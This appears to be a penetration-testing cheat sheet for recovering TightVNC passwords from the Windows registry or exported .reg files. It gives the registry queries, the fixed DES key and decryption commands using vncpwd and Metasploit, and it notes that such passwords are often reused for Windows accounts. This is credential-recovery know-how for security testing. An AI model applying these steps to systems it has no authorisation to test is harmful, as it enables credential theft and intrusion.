# TightVNC Registry Password Decrypt

TightVNC stores passwords in the Windows registry encrypted with a static DES key. The encrypted bytes can be extracted from SMB/registry enumeration and decrypted offline.

## Find the Password in Registry

```powershell
# Look in HKLM or HKCU under TightVNC
reg query HKLM\Software\TightVNC\Server
reg query HKCU\Software\TightVNC\Server
# Output: "Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f
```

Also found in SMB shares as `.reg` export files — look for TightVNC in user home directories or backup shares.

## Decrypt with vncpwd

```bash
# Convert hex string to binary then pipe to vncpwd
echo '6bcf2a4b6e5aca0f' | xxd -r -p > vnc_enc_pass
/opt/vncpwd/vncpwd vnc_enc_pass

# One-liner using process substitution
/opt/vncpwd/vncpwd <(echo '6bcf2a4b6e5aca0f' | xxd -r -p)
```

## Decrypt via Metasploit IRB

```ruby
msf> irb
fixedkey = "\x17\x52\x6b\x06\x23\x4e\x58\x07"
require 'rex/proto/rfb'
Rex::Proto::RFB::Cipher.decrypt ["6bcf2a4b6e5aca0f"].pack('H*'), fixedkey
# => "decryptedpassword"
```

## Notes
- TightVNC uses a fixed DES key — the same key for every installation
- Encrypted password is 8 bytes (16 hex chars) — longer passwords are truncated
- Password is often reused as a Windows user account password
- Also check: `ultravnc.ini` for UltraVNC passwords (same fixed-key DES encryption)
